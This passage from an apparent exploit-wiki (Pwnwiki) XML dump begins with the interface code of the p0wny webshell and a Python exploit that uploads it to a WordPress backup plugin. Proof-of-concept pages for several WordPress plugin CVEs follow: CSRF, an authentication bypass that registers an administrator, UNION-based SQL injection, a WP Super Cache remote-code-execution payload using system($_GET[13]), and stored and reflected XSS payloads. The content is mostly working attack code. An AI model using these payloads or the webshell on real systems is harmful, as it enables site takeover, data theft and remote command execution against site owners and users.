&lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------17366980624047956771255332862--\r\n"
session.post(exploit_url, headers=header, data=body)
print('[+] Exploit done !')
print(' -&gt; Webshell uploaded to: http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/backup-guard/shell.php')
print('')</text>
      <sha1>0mdumpuq27fpb3fq30zpg36guy4dqoh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24174 WordPress Plugin Database Backups 1.2.2.6 CSRF漏洞</title>
    <ns>0</ns>
    <id>4129</id>
    <revision>
      <id>4757</id>
      <timestamp>2021-06-11T09:41:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==CSRF== &lt;pre&gt; # Exploit Title: WordPress Plugin Database Backups 1.2.2.6 - 'Database Backup Download' CSRF # Date: 2/10/2021 # Author: 0xB9 # Software Link: https://wordpress..."</comment>
      <origin>4757</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="819" sha1="hw04vvx5wdqz9jpb4qv7brgo4r8s0c1" xml:space="preserve">==CSRF==
&lt;pre&gt;
# Exploit Title: WordPress Plugin Database Backups 1.2.2.6 - 'Database Backup Download' CSRF
# Date: 2/10/2021
# Author: 0xB9
# Software Link: https://wordpress.org/plugins/database-backups/
# Version: 1.2.2.6
# Tested on: Windows 10
# CVE: CVE-2021-24174

1. Description:
This plugin allows admins to create and download database backups. A CSRF can create DB backups stored publicly in the uploads directory.

2. Proof of Concept:

&lt;form action="http://localhost/wp-admin/tools.php?page=database-backups" method="post"&gt;
    &lt;input type="hidden" name="do_backup_manually" value="1"&gt;
    &lt;input type="submit" class="button button-primary" value="Do backup" autocomplete="off"&gt;            
&lt;/form&gt;

Backups can be accessed by the following URL.
http://localhost/wp-content/uploads/database-backups/
&lt;/pre&gt;</text>
      <sha1>hw04vvx5wdqz9jpb4qv7brgo4r8s0c1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24175 WordPress Elementor Page Builder Plus插件身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>2527</id>
    <revision>
      <id>3023</id>
      <timestamp>2021-05-22T02:00:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== Elementor Page Builder &lt;4.1.7  ==POC== &lt;pre&gt; curl -X POST --data action=theplus_ajax_login --data email=admin -iLSS https://example.com/wp-admin/admin-ajax.ph..."</comment>
      <origin>3023</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="945" sha1="fsngfas33738qpjc08t5edl23lneb35" xml:space="preserve">==影響版本==
Elementor Page Builder &lt;4.1.7

==POC==
&lt;pre&gt;
curl -X POST --data action=theplus_ajax_login --data email=admin -iLSS https://example.com/wp-admin/admin-ajax.php
curl -X POST --data action=theplus_google_ajax_register --data email=admin --data nonce=a -iLSS https://example.com/wp-admin/admin-ajax.php
&lt;/pre&gt;

"theplus_google_ajax_register" AJAX請求還可以允許任何未經身份驗證的用戶創建具有任意角色的帳戶，例如admin，然後登錄。

html：
&lt;pre&gt;
&lt;form method="POST" action="https://example.com/wp-admin/admin-ajax.php"&gt;
&lt;input value="newadmin" name="name" type="text"&gt;
&lt;input value="test@example.com" name="email" type="text"&gt;
&lt;input value="test" name="password" type="text"&gt;
&lt;input value="theplus_google_ajax_register" name="action" type="text"&gt;
&lt;input value="administrator" name="tp_user_reg_role" type="text"&gt;
&lt;input value="any" name="nonce" type="text"&gt;
&lt;input type="submit" /&gt;
&lt;/form&gt;
&lt;/pre&gt;</text>
      <sha1>fsngfas33738qpjc08t5edl23lneb35</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24186 WordPress插件Tutor LMS SQL注入漏洞</title>
    <ns>0</ns>
    <id>2530</id>
    <revision>
      <id>3026</id>
      <timestamp>2021-05-22T02:05:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Tutor LMS – eLearning and online course solution &lt; 1.8.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; POST /courses/first-class/tutor_quiz/test/ HTTP/1.1 Host: [URL] Content..."</comment>
      <origin>3026</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1232" sha1="t0ilpl1tgjb1omqwvsaxhnehal73mj7" xml:space="preserve">==影響版本==
&lt;pre&gt;
Tutor LMS – eLearning and online course solution &lt; 1.8.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
POST /courses/first-class/tutor_quiz/test/ HTTP/1.1
Host: [URL]
Content-Length: 413
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: [URL]
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: [URL]
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: [COOKIES]
Connection: close

_wpnonce=[REPLACE_WITH_VALID_NONCE]&amp;_wp_http_referer=%2Fcourses%2Ffirst-class%2Ftutor_quiz%2Ftest%2F&amp;attempt_id=1&amp;tutor_action=tutor_answering_quiz_question&amp;attempt%5B1%5D%5Bquiz_question_ids%5D%5B%5D=&amp;attempt%5B1%5D%5Bquiz_question%5D%5B1%5D=1 UNION select 1,2,3,version(),5,6,7,8,9,10.11,12,13;--&amp;attempt%5B1%5D%5Bquiz_question_ids%5D%5B%5D=2&amp;attempt%5B1%5D%5Bquiz_question%5D%5B2%5D=5&amp;quiz_answer_submit_btn=quiz_answer_submit
Then send a GET request to

http://[URL]/dashboard/my-quiz-attempts/attempts-details/?attempt_id=1

&lt;/pre&gt;</text>
      <sha1>t0ilpl1tgjb1omqwvsaxhnehal73mj7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24209 WordPress WP Super Cache插件小於1.7.2 RCE漏洞</title>
    <ns>0</ns>
    <id>2529</id>
    <revision>
      <id>3025</id>
      <timestamp>2021-05-22T02:03:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; POST /wp-admin/options-general.php?page=wpsupercache&amp;tab=settings HTTP/1.1 User-Agent: Mozilla/5.0 Content-Type: application/x-www-form-urlencoded Content-Length..."</comment>
      <origin>3025</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="877" sha1="4tz12ecclocfs86zk7v1csujbuu18jw" xml:space="preserve">==POC==
&lt;pre&gt;
POST /wp-admin/options-general.php?page=wpsupercache&amp;tab=settings HTTP/1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 501
Cookie: [admin cookies]

_wpnonce=88a432b100&amp;_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dwpsupercache%26tab%3Dsettings&amp;action=scupdates&amp;wp_cache_enabled=1&amp;wp_cache_mod_rewrite=0&amp;wp_cache_not_logged_in=2&amp;cache_rebuild_files=1&amp;wp_cache_location=%2Fvar%2Fwww%2Fyour%2Fown%2Fpath%2Fexample.com%2Fwp-content%2Fcache%2F%27%3Bsystem%28%24_GET%5B13%5D%29%3Binclude_once+%5C%27wp-cache-config.php%5C%27%3B%27&amp;_wpnonce=88a432b100&amp;_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dwpsupercache%26tab%3Dsettings 

&lt;/pre&gt;

==Payload==
&lt;pre&gt;
';system($_GET[13]);include_once \'wp-cache-config.php\';'

';`$_GET[13]`;include_once \'wp-cache-config.php\';?&gt;&lt;!--

';`$_GET[13]`;#

&lt;/pre&gt;</text>
      <sha1>4tz12ecclocfs86zk7v1csujbuu18jw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24213 WordPress GiveWP 2.9.7 反射型XSS漏洞</title>
    <ns>0</ns>
    <id>2528</id>
    <revision>
      <id>3024</id>
      <timestamp>2021-05-22T02:01:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; http://localhost/wp-admin/edit.php?s=%22%3E&lt;script&gt;alert(0)&lt;/script&gt;&amp;start-date&amp;end-date&amp;form_id=0&amp;action=-1&amp;paged=1&amp;give_action=delete_bulk_donor&amp;orderby=id&amp;ord..."</comment>
      <origin>3024</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="250" sha1="ktxirmerc1vkko4jefgpc1docmoxz4b" xml:space="preserve">==POC==
&lt;pre&gt;
http://localhost/wp-admin/edit.php?s=%22%3E&lt;script&gt;alert(0)&lt;/script&gt;&amp;start-date&amp;end-date&amp;form_id=0&amp;action=-1&amp;paged=1&amp;give_action=delete_bulk_donor&amp;orderby=id&amp;order=DESC&amp;action2=-1&amp;post_type=give_forms&amp;page=give-donors&amp;view=donors
&lt;/pre&gt;</text>
      <sha1>ktxirmerc1vkko4jefgpc1docmoxz4b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24245 WordPress Plugin Stop Spammers 2021.8 - 'log' Reflected XSS漏洞</title>
    <ns>0</ns>
    <id>2500</id>
    <revision>
      <id>2990</id>
      <timestamp>2021-05-19T10:04:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: WordPress Plugin Stop Spammers 2021.8 - 'log' Reflected Cross-site Scripting (XSS) # Date: 04/08/2021 # Exploit Author: Hosein Vita # Vendor Hom..."</comment>
      <origin>2990</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1355" sha1="rxfu2f8eznfoddqaqg0hswrm7dbvi18" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: WordPress Plugin Stop Spammers 2021.8 - 'log' Reflected Cross-site Scripting (XSS)
# Date: 04/08/2021
# Exploit Author: Hosein Vita
# Vendor Homepage: https://wordpress.org/plugins/stop-spammer-registrations-plugin/
# Software Link: https://downloads.wordpress.org/plugin/stop-spammer-registrations-plugin.zip
# Version: &lt;= 2021.8
# Tested on: Windows-Ubuntu
# CVE : CVE-2021-24245

Summary:

Reflected cross-site scripting (XSS) vulnerabilities in 'Stop Spammers &lt;= 2021.8' allow remote attackers to run arbitary javascript

Proof of concepts:

1-Install "Stop Spammers &lt;= 2021.8" in your wordpress website
2-For testing remove your IP address from the allowed list
3-Go to http://&lt;YOUR-WEBSITE&gt;/wp-admin
4-In username field enter this payload ~&gt; ad" accesskey=X onclick=alert(1) "
#Notice the `ad` keyword must be in your payload!
5-Press Alt + Shift + X to trigger Xss
#Tested on Firefox

Request POC:

POST /wp-login.php HTTP/1.1
Host: localhost
Connection: close
Content-Length: 161
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check;

log=ad%22+accesskey%3DX+onclick%3Dalert%281%29+%22&amp;pwd=&amp;wp-submit=%D9%88%D8%B1%D9%88%D8%AF&amp;redirect_to=http://localhost/wp-admin&amp;testcookie=1
&lt;/pre&gt;</text>
      <sha1>rxfu2f8eznfoddqaqg0hswrm7dbvi18</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24299 WordPress Plugin ReDi Restaurant Reservation 21.0307 XSS漏洞</title>
    <ns>0</ns>
    <id>2752</id>
    <revision>
      <id>3251</id>
      <timestamp>2021-05-24T13:25:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: WordPress Plugin ReDi Restaurant Reservation 21.0307 - 'Comment' Stored Cross-Site Scripting (XSS) # Date: 2021-05-10 # Exploit Author: Bastijn..."</comment>
      <origin>3251</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1003" sha1="ik41f4mogoqrtmwwp1jmr3sjmeqkgcw" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: WordPress Plugin ReDi Restaurant Reservation 21.0307 - 'Comment' Stored Cross-Site Scripting (XSS)
# Date: 2021-05-10
# Exploit Author: Bastijn Ouwendijk
# Vendor Homepage: https://reservationdiary.eu/
# Software Link: https://wordpress.org/plugins/redi-restaurant-reservation/
# Version: 21.0307 and earlier
# Tested on: Windows 10
# CVE : CVE-2021-24299
# Proof: https://bastijnouwendijk.com/cve-2021-24299/

Steps to exploit this vulnerability:

1. Go to the page where [redirestaurant] is embed to make a restaurant reservation by filling in the requested information
2. In the 'Comment' field of the restaurant reservation form put the payload: `&lt;script&gt;alert("XSS")&lt;/script&gt;`
3. Submit the form
4. While being logged into WordPress as administrator go to ReDi Reservations &gt; Upcoming (Tablet PC)
5. Click on 'View upcoming reservations'
6. Select for 'Show reservations for': 'This week'
7. The reservations are loaded and two alerts are shown with text 'XSS'
&lt;/pre&gt;</text>
      <sha1>ik41f4mogoqrtmwwp1jmr3sjmeqkgcw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24308 WordPress Plugin LifterLMS 4.21.0 XSS漏洞</title>
    <ns>0</ns>
    <id>3099</id>
    <revision>
      <id>3599</id>
      <timestamp>2021-05-28T09:45:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: WordPress Plugin LifterLMS 4.21.0 - Stored Cross-Site Scripting (XSS)  # Date: 2021-05-10 # Exploit Author: Captain_hook # Vendor Homepage: http..."</comment>
      <origin>3599</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1452" sha1="kq883zaryga3v1gv0nyyh1z7guylhkm" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: WordPress Plugin LifterLMS 4.21.0 - Stored Cross-Site Scripting (XSS) 
# Date: 2021-05-10
# Exploit Author: Captain_hook
# Vendor Homepage: https://lifterlms.com/
# Software Link: https://github.com/gocodebox/lifterlms/releases/tag/4.21.0
# Version: LifterLMS &lt; 4.21.1
# Tested on: ANY
# CVE : CVE-2021-24308

#Summary:

The 'State' field of the Edit profile page of the LMS by LifterLMS â€“ Online Course, Membership &amp; Learning Management System Plugin for WordPress plugin before 4.21.1 is not properly sanitised when output in the About section of the profile page, leading to a stored Cross-Site Scripting issue. This could allow low privilege users (such as students) to elevate their privilege via an XSS attack when an admin will view their profile.

#Proof_of_Concept:

1- As a Lowest Privilege user go to the edit account page of the LMS
(e.g https://example.com/my-courses/edit-account/)

2- Put Your XSS payload in State parameter and save your edits, such
as "&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;

3- The XSS will be stored and triggered in the about section of the profile: (e.g  https://example.com/directory/[user_name]/) (Note): The XSS will also be triggered in the admin dashboard when viewing the user details, for example https://example.com/wp-admin/admin.php?page=llms-reporting&amp;tab=students&amp;stab=information&amp;student_id=2

Refernces:

https://github.com/gocodebox/lifterlms/releases/tag/4.21.0
&lt;/pre&gt;</text>
      <sha1>kq883zaryga3v1gv0nyyh1z7guylhkm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24365 WordPress Admin Columns XSS漏洞</title>
    <ns>0</ns>
    <id>4831</id>
    <revision>
      <id>5568</id>
      <timestamp>2021-06-23T07:27:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== WordPress Admin Columns plugin versions below 5.5.2 Pro and 4.3.2 Pro suffers from a cross site scripting vulnerability.  ==XSS== &lt;pre&gt; Proof of Concept (PoC):  1. Cr..."</comment>
      <origin>5568</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="747" sha1="sje9ztt7cm1oqp5rd28gcheu8660qus" xml:space="preserve">==INFO==
WordPress Admin Columns plugin versions below 5.5.2 Pro and 4.3.2 Pro suffers from a cross site scripting vulnerability.

==XSS==
&lt;pre&gt;
Proof of Concept (PoC):

1. Create a custom field for WordPress users which allows storing HTML
    control characters. This can be done, e.g., with the "Advanced Custom
    Fields" plug-in [2].

2. Store "&lt;img src=0 onerror=alert()&gt;" in the custom field for any user.

3. Open the Admin Columns plug-in settings.

4. Choose the "Admin Columns" tab and select "Users" from the drop-down
    menu.

5. Click "Add Column", choose the type "Custom Field" and select the
    previously created custom field.

6. Open the user list in the WordPress back end. The JavaScript code
    will be executed.
&lt;/pre&gt;</text>
      <sha1>sje9ztt7cm1oqp5rd28gcheu8660qus</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24383 WordPress Plugin WP Google Maps 8.1.11 XSS漏洞</title>
    <ns>0</ns>
    <id>4832</id>
    <revision>
      <id>5569</id>
      <timestamp>2021-06-24T01:06:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: WordPress Plugin WP Google Maps 8.1.11 - Stored Cross-Site Scripting (XSS) # Date: 22/6/2021 # Exploit Author: Mohammed Adam # Vendor Homepage: https://..."</comment>
      <origin>5569</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="729" sha1="jcirvs7419xo5wxbp9hsp8udou8xczj" xml:space="preserve">&lt;pre&gt;
# Exploit Title: WordPress Plugin WP Google Maps 8.1.11 - Stored Cross-Site Scripting (XSS)
# Date: 22/6/2021
# Exploit Author: Mohammed Adam
# Vendor Homepage: https://www.wpgmaps.com/
# Software Link: https://wordpress.org/plugins/wp-google-maps/
# Version: 5.7.2
# Tested on: Windows 10
# CVE: CVE-2021-24383
# References link: https://wpscan.com/vulnerability/1270588c-53fe-447e-b83c-1b877dc7a954

*Proof of Concept*

*Steps to Reproduce:*

1) Edit a map (e.g
/wp-admin/admin.php?page=wp-google-maps-menu&amp;action=edit&amp;map_id=1)

2) Change Map Name to &lt;script&gt;alert(document.cookie)&lt;/script&gt;

3) Save the Map

4) Stored XSS will be triggered when viewing the Map List
(/wp-admin/admin.php?page=wp-google-maps-menu)
&lt;/pre&gt;</text>
      <sha1>jcirvs7419xo5wxbp9hsp8udou8xczj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25281&amp;CVE-2021-25282&amp;CVE-2021-25283 Saltstack未授權RCE漏洞</title>
    <ns>0</ns>
    <id>6242</id>
    <revision>
      <id>7152</id>
      <timestamp>2021-07-13T11:02:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; All versions before Saltstack 3002.2 SaltStack =&lt; 3002.2 SaltStack =&lt; 3001.4 SaltStack =&lt; 3000.6  &lt;translate&gt; salt-api..."</comment>
      <origin>7152</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
